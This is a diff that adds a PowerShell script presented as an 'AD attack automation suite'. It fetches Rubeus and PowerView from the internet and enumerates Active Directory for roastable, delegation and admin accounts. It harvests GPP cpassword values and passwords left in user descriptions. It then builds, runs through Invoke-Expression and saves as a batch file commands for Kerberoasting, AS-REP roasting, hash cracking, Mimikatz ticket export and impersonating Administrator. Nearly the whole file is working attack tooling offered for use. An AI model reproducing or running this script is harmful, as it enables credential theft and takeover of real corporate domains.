@@ -1,0 +1,633 @@
+# AD-Attack-Automator.ps1 - Complete attack automation with tool detection
+
+# ================================================
+# 1. TOOL DETECTION & AUTO-DEPLOYMENT
+# ================================================
+
+function Get-RequiredTools {
+    Write-Host "`n[+] Checking for required attack tools..." -ForegroundColor Yellow
+    
+    $tools = @{
+        Rubeus = @{
+            Path = ".\Rubeus.exe"
+            URL = "https://github.com/r3motecontrol/Ghostpack-binaries/raw/main/Rubeus.exe"
+            Check = { Test-Path ".\Rubeus.exe" }
+            Description = "Kerberos attack tool for AS-REP/Kerberoasting"
+        }
+        Mimikatz = @{
+            Path = ".\mimikatz.exe"
+            URL = "https://github.com/gentilkiwi/mimikatz/releases/latest"
+            Check = { Test-Path ".\mimikatz.exe" }
+            Description = "Credential extraction and lateral movement"
+        }
+        Impacket = @{
+            Path = "python"
+            Check = { Get-Command python -ErrorAction SilentlyContinue }
+            Description = "Python suite for network attacks"
+        }
+        Hashcat = @{
+            Path = ".\hashcat.exe"
+            Check = { Test-Path ".\hashcat.exe" }
+            Description = "Password cracking"
+        }
+        PowerView = @{
+            Path = ".\PowerView.ps1"
+            URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
+            Check = { Test-Path ".\PowerView.ps1" }
+            Description = "Active Directory enumeration"
+        }
+    }
+    
+    $available = @()
+    $missing = @()
+    
+    foreach ($tool in $tools.GetEnumerator()) {
+        $checkResult = & $tool.Value.Check
+        if ($checkResult) {
+            Write-Host "  [✓] $($tool.Key)" -ForegroundColor Green
+            $available += $tool.Key
+        } else {
+            Write-Host "  [✗] $($tool.Key)" -ForegroundColor Red
+            $missing += $tool
+        }
+    }
+    
+    return @{
+        Available = $available
+        Missing = $missing
+        ToolInfo = $tools
+    }
+}
+
+function Install-MissingTools {
+    param([array]$MissingTools)
+    
+    if ($MissingTools.Count -eq 0) {
+        return $true
+    }
+    
+    Write-Host "`n[!] Missing tools detected:" -ForegroundColor Yellow
+    $MissingTools | ForEach-Object {
+        Write-Host "  • $($_.Key): $($_.Value.Description)" -ForegroundColor White
+    }
+    
+    Write-Host "`n[*] Attempt to download missing tools? (Y/N): " -ForegroundColor Cyan -NoNewline
+    $response = Read-Host
+    
+    if ($response -notmatch '^[Yy]') {
+        return $false
+    }
+    
+    foreach ($tool in $MissingTools) {
+        if ($tool.Value.URL) {
+            Write-Host "  Downloading $($tool.Key)..." -ForegroundColor Gray
+            try {
+                Invoke-WebRequest -Uri $tool.Value.URL -OutFile $tool.Value.Path -ErrorAction Stop
+                Write-Host "    [✓] Downloaded $($tool.Key)" -ForegroundColor Green
+            } catch {
+                Write-Host "    [✗] Failed to download $($tool.Key)" -ForegroundColor Red
+            }
+        }
+    }
+    
+    return $true
+}
+
+# ================================================
+# 2. ADVANCED AD ENUMERATION
+# ================================================
+
+function Get-AdvancedAttackSurface {
+    Write-Host "`n[+] Performing comprehensive AD enumeration..." -ForegroundColor Yellow
+    
+    $results = @{
+        ASREPRoastable = @()
+        Kerberoastable = @()
+        Unconstrained = @()
+        Constrained = @()
+        RBCD = @()
+        PasswordsInDescriptions = @()
+        AdminUsers = @()
+        DomainAdmins = @()
+        EnterpriseAdmins = @()
+        GPPPasswords = @()
+    }
+    
+    # Load PowerView if not loaded
+    if (-not (Get-Command Get-DomainUser -ErrorAction SilentlyContinue)) {
+        if (Test-Path ".\PowerView.ps1") {
+            Import-Module .\PowerView.ps1 -Force
+            Write-Host "  [✓] PowerView loaded" -ForegroundColor Green
+        }
+    }
+    
+    # AS-REP Roasting
+    try {
+        $asrep = Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname, useraccountcontrol
+        foreach ($user in $asrep) {
+            $results.ASREPRoastable += [PSCustomObject]@{
+                Account = $user.samaccountname
+                UPN = $user.userprincipalname
+                UAC = $user.useraccountcontrol
+            }
+        }
+        Write-Host "  [✓] AS-REP accounts: $($results.ASREPRoastable.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] AS-REP check failed" -ForegroundColor Red }
+    
+    # Kerberoasting
+    try {
+        $spnUsers = Get-DomainUser -SPN | Select-Object samaccountname, userprincipalname, serviceprincipalname
+        foreach ($user in $spnUsers) {
+            $spns = if ($user.serviceprincipalname) { 
+                ($user.serviceprincipalname -join ", ") 
+            } else { 
+                "No SPNs" 
+            }
+            $results.Kerberoastable += [PSCustomObject]@{
+                Account = $user.samaccountname
+                UPN = $user.userprincipalname
+                SPNs = $spns
+            }
+        }
+        Write-Host "  [✓] Kerberoastable accounts: $($results.Kerberoastable.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] Kerberoasting check failed" -ForegroundColor Red }
+    
+    # Unconstrained Delegation
+    try {
+        $unconstrained = Get-DomainComputer -Unconstrained | Select-Object Name, operatingsystem
+        foreach ($comp in $unconstrained) {
+            $results.Unconstrained += [PSCustomObject]@{
+                Computer = $comp.Name
+                OS = $comp.operatingsystem
+            }
+        }
+        Write-Host "  [✓] Unconstrained computers: $($results.Unconstrained.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] Unconstrained check failed" -ForegroundColor Red }
+    
+    # Constrained Delegation
+    try {
+        $constrained = Get-DomainComputer -TrustedToAuth | Select-Object Name, msds-allowedtodelegateto
+        foreach ($comp in $constrained) {
+            $results.Constrained += [PSCustomObject]@{
+                Computer = $comp.Name
+                AllowedTo = $comp.'msds-allowedtodelegateto'
+            }
+        }
+        Write-Host "  [✓] Constrained delegation: $($results.Constrained.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] Constrained check failed" -ForegroundColor Red }
+    
+    # RBCD (Resource Based Constrained Delegation)
+    try {
+        $rbcd = Get-DomainComputer -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" | Select-Object Name
+        foreach ($comp in $rbcd) {
+            $results.RBCD += [PSCustomObject]@{
+                Computer = $comp.Name
+            }
+        }
+        Write-Host "  [✓] RBCD targets: $($results.RBCD.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] RBCD check failed" -ForegroundColor Red }
+    
+    # Passwords in descriptions
+    try {
+        $users = Get-DomainUser -Properties description, samaccountname | Where-Object { $_.description -match "(?i)password|pass|pwd" }
+        foreach ($user in $users) {
+            $results.PasswordsInDescriptions += [PSCustomObject]@{
+                Account = $user.samaccountname
+                Description = $user.description
+            }
+        }
+        Write-Host "  [✓] Passwords in descriptions: $($results.PasswordsInDescriptions.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] Description check failed" -ForegroundColor Red }
+    
+    # Admin users
+    try {
+        $admins = Get-DomainUser -AdminCount | Select-Object samaccountname, userprincipalname
+        foreach ($admin in $admins) {
+            $results.AdminUsers += [PSCustomObject]@{
+                Account = $admin.samaccountname
+                UPN = $admin.userprincipalname
+            }
+        }
+        Write-Host "  [✓] Admin users: $($results.AdminUsers.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] Admin check failed" -ForegroundColor Red }
+    
+    # Domain Admins
+    try {
+        $daGroup = Get-DomainGroupMember "Domain Admins" | Select-Object MemberName
+        foreach ($member in $daGroup) {
+            $results.DomainAdmins += [PSCustomObject]@{
+                Account = $member.MemberName
+            }
+        }
+        Write-Host "  [✓] Domain Admins: $($results.DomainAdmins.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] Domain Admins check failed" -ForegroundColor Red }
+    
+    # Enterprise Admins
+    try {
+        $eaGroup = Get-DomainGroupMember "Enterprise Admins" | Select-Object MemberName
+        foreach ($member in $eaGroup) {
+            $results.EnterpriseAdmins += [PSCustomObject]@{
+                Account = $member.MemberName
+            }
+        }
+        Write-Host "  [✓] Enterprise Admins: $($results.EnterpriseAdmins.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] Enterprise Admins check failed" -ForegroundColor Red }
+    
+    # Check for GPP passwords
+    try {
+        $gppPaths = @("\\$env:COMPUTERNAME\SYSVOL", "C:\Windows\SYSVOL", "\\DC01\SYSVOL")
+        foreach ($path in $gppPaths) {
+            if (Test-Path $path) {
+                $gppFiles = Get-ChildItem -Path "$path\*\Policies\*\Machine\Preferences\Groups\*.xml" -ErrorAction SilentlyContinue
+                if ($gppFiles) {
+                    foreach ($file in $gppFiles) {
+                        $content = Get-Content $file.FullName -Raw
+                        if ($content -match 'cpassword="([^"]+)"') {
+                            $results.GPPPasswords += [PSCustomObject]@{
+                                File = $file.FullName
+                                Password = $matches[1]
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        Write-Host "  [✓] GPP passwords: $($results.GPPPasswords.Count)" -ForegroundColor Green
+    } catch { Write-Host "  [✗] GPP check failed" -ForegroundColor Red }
+    
+    return $results
+}
+
+# ================================================
+# 3. ATTACK COMMAND GENERATOR
+# ================================================
+
+function Generate-AttackCommands {
+    param(
+        [hashtable]$AttackSurface,
+        [array]$AvailableTools
+    )
+    
+    Write-Host "`n[+] Generating attack commands..." -ForegroundColor Yellow
+    
+    $commands = @()
+    
+    # AS-REP Roasting commands
+    if ($AttackSurface.ASREPRoastable.Count -gt 0 -and $AvailableTools -contains "Rubeus") {
+        foreach ($account in $AttackSurface.ASREPRoastable | Select-Object -First 5) {
+            $commands += [PSCustomObject]@{
+                Category = "AS-REP Roasting"
+                Target = $account.Account
+                Command = ".\Rubeus.exe asreproast /user:$($account.Account) /format:hashcat /nowrap /outfile:asrep_$($account.Account).hash"
+                Hashcat = "hashcat -m 18200 asrep_$($account.Account).hash rockyou.txt -O"
+                Description = "Get TGT for account with pre-auth disabled"
+            }
+        }
+    }
+    
+    # Kerberoasting commands
+    if ($AttackSurface.Kerberoastable.Count -gt 0 -and $AvailableTools -contains "Rubeus") {
+        foreach ($account in $AttackSurface.Kerberoastable | Select-Object -First 5) {
+            $commands += [PSCustomObject]@{
+                Category = "Kerberoasting"
+                Target = $account.Account
+                Command = ".\Rubeus.exe kerberoast /user:$($account.Account) /outfile:tgs_$($account.Account).kirbi"
+                Hashcat = "python kirbi2hashcat.py tgs_$($account.Account).kirbi | hashcat -m 13100 - rockyou.txt"
+                Description = "Get TGS for service account"
+            }
+        }
+    }
+    
+    # Unconstrained Delegation attacks
+    if ($AttackSurface.Unconstrained.Count -gt 0 -and $AvailableTools -contains "Rubeus") {
+        foreach ($computer in $AttackSurface.Unconstrained | Select-Object -First 3) {
+            $commands += [PSCustomObject]@{
+                Category = "Unconstrained Delegation"
+                Target = $computer.Computer
+                Command = ".\Rubeus.exe monitor /interval:5 /nowrap"
+                Mimikatz = "privilege::debug sekurlsa::tickets /export"
+                Description = "Monitor for tickets on unconstrained computer"
+            }
+        }
+    }
+    
+    # Password in description attacks
+    if ($AttackSurface.PasswordsInDescriptions.Count -gt 0) {
+        foreach ($account in $AttackSurface.PasswordsInDescriptions | Select-Object -First 3) {
+            $passMatch = [regex]::Match($account.Description, "(?i)(password|pass|pwd)[:\s]*([^\s]+)")
+            if ($passMatch.Success) {
+                $commands += [PSCustomObject]@{
+                    Category = "Description Password"
+                    Target = $account.Account
+                    Command = "net use \\$env:COMPUTERNAME /user:$($account.Account) `"$($passMatch.Groups[2].Value)`""
+                    Test = "net use * /d /y && $($_.Command)"
+                    Description = "Password found in description field"
+                }
+            }
+        }
+    }
+    
+    # GPP Password attacks
+    if ($AttackSurface.GPPPasswords.Count -gt 0) {
+        foreach ($gpp in $AttackSurface.GPPPasswords | Select-Object -First 3) {
+            $commands += [PSCustomObject]@{
+                Category = "GPP Password"
+                Target = "GPP File"
+                Command = "`$cpassword = '$($gpp.Password)'; `$base64 = `$cpassword; `$key = [byte[]](1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16); `$cipher = [System.Convert]::FromBase64String(`$base64); `$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider; `$aes.Mode = 'CBC'; `$aes.Key = `$key; `$aes.IV = `$cipher[0..15]; `$decryptor = `$aes.CreateDecryptor(); `$plain = `$decryptor.TransformFinalBlock(`$cipher, 16, `$cipher.Length-16); [System.Text.Encoding]::UTF8.GetString(`$plain)"
+                Description = "Decrypt GPP cpassword from $($gpp.File)"
+            }
+        }
+    }
+    
+    # RBCD attacks (if we have a compromised account)
+    if ($AttackSurface.RBCD.Count -gt 0 -and $AvailableTools -contains "Rubeus") {
+        foreach ($computer in $AttackSurface.RBCD | Select-Object -First 2) {
+            $commands += [PSCustomObject]@{
+                Category = "RBCD Attack"
+                Target = $computer.Computer
+                Command = ".\Rubeus.exe s4u /user:COMPROMISED_USER /rc4:HASH_OF_COMPROMISED_USER /msdsspn:cifs/$($computer.Computer) /impersonateuser:Administrator /ptt"
+                Description = "Resource Based Constrained Delegation attack"
+            }
+        }
+    }
+    
+    # Constrained Delegation attacks
+    if ($AttackSurface.Constrained.Count -gt 0 -and $AvailableTools -contains "Rubeus") {
+        foreach ($computer in $AttackSurface.Constrained | Select-Object -First 2) {
+            $commands += [PSCustomObject]@{
+                Category = "Constrained Delegation"
+                Target = $computer.Computer
+                Command = ".\Rubeus.exe s4u /user:COMPROMISED_USER /rc4:HASH_OF_COMPROMISED_USER /msdsspn:$($computer.AllowedTo) /impersonateuser:Administrator"
+                Description = "Constrained delegation attack"
+            }
+        }
+    }
+    
+    return $commands
+}
+
+# ================================================
+# 4. AUTO-EXECUTE ATTACKS (Optional)
+# ================================================
+
+function Execute-SelectedAttacks {
+    param([array]$AttackCommands)
+    
+    Write-Host "`n[?] Select attacks to execute:" -ForegroundColor Cyan
+    
+    for ($i = 0; $i -lt $AttackCommands.Count; $i++) {
+        Write-Host "  [$i] $($AttackCommands[$i].Category): $($AttackCommands[$i].Target)" -ForegroundColor White
+        Write-Host "      $($AttackCommands[$i].Description)" -ForegroundColor Gray
+    }
+    
+    Write-Host "  [A] Execute ALL attacks" -ForegroundColor Yellow
+    Write-Host "  [N] None (generate commands only)" -ForegroundColor Yellow
+    
+    Write-Host "`n[*] Enter selection (comma-separated, A for all, N for none): " -ForegroundColor Cyan -NoNewline
+    $selection = Read-Host
+    
+    if ($selection -eq "N" -or $selection -eq "n") {
+        return
+    }
+    
+    $selectedIndices = @()
+    if ($selection -eq "A" -or $selection -eq "a") {
+        $selectedIndices = 0..($AttackCommands.Count - 1)
+    } else {
+        $selectedIndices = $selection -split ',' | ForEach-Object { [int]$_.Trim() }
+    }
+    
+    Write-Host "`n[+] Executing selected attacks..." -ForegroundColor Green
+    
+    foreach ($index in $selectedIndices) {
+        if ($index -ge 0 -and $index -lt $AttackCommands.Count) {
+            $attack = $AttackCommands[$index]
+            Write-Host "`n  [!] Executing: $($attack.Category) on $($attack.Target)" -ForegroundColor Red
+            Write-Host "  Command: $($attack.Command)" -ForegroundColor Yellow
+            
+            Write-Host "  [*] Execute this command? (Y/N/Skip): " -ForegroundColor Cyan -NoNewline
+            $confirm = Read-Host
+            
+            if ($confirm -match '^[Yy]') {
+                try {
+                    Invoke-Expression $attack.Command
+                    Write-Host "  [✓] Command executed" -ForegroundColor Green
+                } catch {
+                    Write-Host "  [✗] Execution failed: $_" -ForegroundColor Red
+                }
+            } elseif ($confirm -match '^[Ss]') {
+                Write-Host "  [-] Skipped" -ForegroundColor Gray
+            }
+        }
+    }
+}
+
+# ================================================
+# 5. SAVE ATTACK PLAN
+# ================================================
+
+function Save-AttackPlan {
+    param(
+        [hashtable]$AttackSurface,
+        [array]$AttackCommands,
+        [array]$AvailableTools
+    )
+    
+    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $planName = "AD_Attack_Plan_$timestamp"
+    
+    Write-Host "`n[+] Saving attack plan..." -ForegroundColor Yellow
+    
+    # Save detailed findings
+    $findingsFile = "$planName_Findings.json"
+    $AttackSurface | ConvertTo-Json -Depth 5 | Out-File $findingsFile
+    Write-Host "  [✓] Findings: $findingsFile" -ForegroundColor Green
+    
+    # Save attack commands
+    $commandsFile = "$planName_Commands.txt"
+    $commandText = @"
+===================================================
+AD ATTACK COMMAND CHEATSHEET
+Generated: $(Get-Date)
+Tools Available: $($AvailableTools -join ', ')
+===================================================
+
+"@
+    
+    foreach ($category in ($AttackCommands | Group-Object Category)) {
+        $commandText += "`n$(('='*50))`n"
+        $commandText += "$($category.Name.ToUpper()) ATTACKS`n"
+        $commandText += "$(('='*50))`n`n"
+        
+        foreach ($cmd in $category.Group) {
+            $commandText += "[$($cmd.Target)]`n"
+            $commandText += "Command: $($cmd.Command)`n"
+            if ($cmd.Hashcat) {
+                $commandText += "Crack: $($cmd.Hashcat)`n"
+            }
+            if ($cmd.Mimikatz) {
+                $commandText += "Mimikatz: $($cmd.Mimikatz)`n"
+            }
+            $commandText += "Description: $($cmd.Description)`n"
+            $commandText += "$(('-'*40))`n`n"
+        }
+    }
+    
+    $commandText | Out-File $commandsFile
+    Write-Host "  [✓] Commands: $commandsFile" -ForegroundColor Green
+    
+    # Create batch file for easy execution
+    $batchFile = "$planName_AutoExec.bat"
+    $batchContent = @"
+@echo off
+echo ======================================
+echo    AD ATTACK AUTOMATION SCRIPT
+echo    Generated: $(Get-Date)
+echo ======================================
+echo.
+
+"@
+    
+    foreach ($cmd in $AttackCommands | Where-Object { $_.Category -in @("AS-REP Roasting", "Kerberoasting") } | Select-Object -First 5) {
+        $batchContent += "echo [!] Running: $($cmd.Category) on $($cmd.Target)`n"
+        $batchContent += "$($cmd.Command)`n"
+        $batchContent += "if %errorlevel% neq 0 echo [ERROR] Command failed`n"
+        $batchContent += "echo.`n"
+    }
+    
+    $batchContent += "echo [!] Attack execution complete`n"
+    $batchContent += "pause`n"
+    
+    $batchContent | Out-File $batchFile
+    Write-Host "  [✓] Batch file: $batchFile" -ForegroundColor Green
+    
+    return $planName
+}
+
+# ================================================
+# 6. MAIN EXECUTION FLOW
+# ================================================
+
+Write-Host @"
+╔══════════════════════════════════════════════════╗
+║          AD ATTACK AUTOMATION SUITE             ║
+║     Complete Attack Surface → Execution         ║
+╚══════════════════════════════════════════════════╝
+"@ -ForegroundColor Red
+
+# Step 1: Check tools
+$tools = Get-RequiredTools
+$installSuccess = Install-MissingTools -MissingTools $tools.Missing
+
+# Update available tools after potential installation
+if ($installSuccess) {
+    $tools = Get-RequiredTools
+}
+
+# Step 2: Enumerate attack surface
+Write-Host "`n" + ("="*60) -ForegroundColor Cyan
+Write-Host " ENUMERATION PHASE " -ForegroundColor Cyan
+Write-Host ("="*60) -ForegroundColor Cyan
+
+$attackSurface = Get-AdvancedAttackSurface
+
+# Step 3: Generate attack commands
+$attackCommands = Generate-AttackCommands -AttackSurface $attackSurface -AvailableTools $tools.Available
+
+# Step 4: Display results
+Write-Host "`n" + ("="*60) -ForegroundColor Red
+Write-Host " ATTACK SURFACE DISCOVERED " -ForegroundColor Red
+Write-Host ("="*60) -ForegroundColor Red
+
+Write-Host "`n🔥 CRITICAL VULNERABILITIES:" -ForegroundColor Red
+if ($attackSurface.ASREPRoastable.Count -gt 0) {
+    Write-Host "  AS-REP Roastable: $($attackSurface.ASREPRoastable.Count)" -ForegroundColor Red
+    $attackSurface.ASREPRoastable | Select-Object -First 3 | ForEach-Object {
+        Write-Host "    • $($_.Account)" -ForegroundColor Red
+    }
+}
+
+if ($attackSurface.Unconstrained.Count -gt 0) {
+    Write-Host "  Unconstrained Delegation: $($attackSurface.Unconstrained.Count)" -ForegroundColor Red
+    $attackSurface.Unconstrained | ForEach-Object {
+        Write-Host "    • $($_.Computer)" -ForegroundColor Red
+    }
+}
+
+Write-Host "`n⚠️  HIGH VALUE TARGETS:" -ForegroundColor Yellow
+if ($attackSurface.Kerberoastable.Count -gt 0) {
+    Write-Host "  Kerberoastable: $($attackSurface.Kerberoastable.Count)" -ForegroundColor Yellow
+    $attackSurface.Kerberoastable | Select-Object -First 3 | ForEach-Object {
+        Write-Host "    • $($_.Account)" -ForegroundColor Yellow
+    }
+}
+
+if ($attackSurface.DomainAdmins.Count -gt 0) {
+    Write-Host "  Domain Admins: $($attackSurface.DomainAdmins.Count)" -ForegroundColor Magenta
+    $attackSurface.DomainAdmins | Select-Object -First 3 | ForEach-Object {
+        Write-Host "    • $($_.Account)" -ForegroundColor Magenta
+    }
+}
+
+if ($attackSurface.PasswordsInDescriptions.Count -gt 0) {
+    Write-Host "  Passwords in Descriptions: $($attackSurface.PasswordsInDescriptions.Count)" -ForegroundColor Cyan
+}
+
+# Step 5: Ask for execution
+if ($attackCommands.Count -gt 0) {
+    Write-Host "`n[?] Do you want to:" -ForegroundColor Cyan
+    Write-Host "  1. Generate attack commands only" -ForegroundColor White
+    Write-Host "  2. Execute attacks interactively" -ForegroundColor White
+    Write-Host "  3. Generate and save complete attack plan" -ForegroundColor White
+    
+    Write-Host "`n[*] Enter choice (1-3): " -ForegroundColor Cyan -NoNewline
+    $choice = Read-Host
+    
+    switch ($choice) {
+        "1" {
+            Write-Host "`n[+] Generated attack commands:" -ForegroundColor Green
+            $attackCommands | ForEach-Object {
+                Write-Host "`n[$($_.Category)] $($_.Target)" -ForegroundColor White
+                Write-Host "  Command: $($_.Command)" -ForegroundColor Yellow
+                if ($_.Hashcat) {
+                    Write-Host "  Crack: $($_.Hashcat)" -ForegroundColor Gray
+                }
+            }
+        }
+        "2" {
+            Execute-SelectedAttacks -AttackCommands $attackCommands
+        }
+        "3" {
+            $planName = Save-AttackPlan -AttackSurface $attackSurface -AttackCommands $attackCommands -AvailableTools $tools.Available
+            Write-Host "`n[✓] Complete attack plan saved with prefix: $planName" -ForegroundColor Green
+        }
+    }
+}
+
+# Step 6: Quick manual commands
+Write-Host "`n" + ("="*60) -ForegroundColor Green
+Write-Host " QUICK MANUAL COMMANDS " -ForegroundColor Green
+Write-Host ("="*60) -ForegroundColor Green
+
+if ($attackSurface.ASREPRoastable.Count -gt 0) {
+    Write-Host "`n[AS-REP Roasting]:" -ForegroundColor Red
+    $firstAsrep = $attackSurface.ASREPRoastable[0].Account
+    Write-Host "  Rubeus: .\Rubeus.exe asreproast /user:$firstAsrep /format:hashcat" -ForegroundColor Yellow
+    Write-Host "  Impacket: python GetNPUsers.py -request -format hashcat INLANEFREIGHT.LOCAL/$firstAsrep" -ForegroundColor Yellow
+}
+
+if ($attackSurface.Kerberoastable.Count -gt 0) {
+    Write-Host "`n[Kerberoasting]:" -ForegroundColor Yellow
+    $firstSpn = $attackSurface.Kerberoastable[0].Account
+    Write-Host "  Rubeus: .\Rubeus.exe kerberoast /user:$firstSpn /outfile:tgs.kirbi" -ForegroundColor Yellow
+    Write-Host "  PowerShell: Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/$firstSpn'" -ForegroundColor Yellow
+}
+
+if ($attackSurface.Unconstrained.Count -gt 0) {
+    Write-Host "`n[Unconstrained Delegation]:" -ForegroundColor Magenta
+    $firstUnconstrained = $attackSurface.Unconstrained[0].Computer
+    Write-Host "  Rubeus: .\Rubeus.exe monitor /interval:5 /targetuser:Administrator" -ForegroundColor Yellow
+    Write-Host "  Mimikatz: privilege::debug sekurlsa::tickets /export" -ForegroundColor Yellow
+}
+
+Write-Host "`n✅ Automation suite completed at $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Green
